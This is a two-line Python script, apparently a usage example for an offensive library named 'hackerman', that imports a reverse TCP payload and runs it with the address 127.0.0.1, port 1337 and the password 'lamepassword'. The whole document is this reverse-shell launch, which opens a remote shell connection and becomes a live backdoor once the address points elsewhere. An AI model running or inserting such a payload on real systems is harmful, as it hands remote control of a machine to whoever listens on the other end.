from hackerman.payloads.reverse import tcp
tcp.Payload(["127.0.0.1",1337], "lamepassword").run()
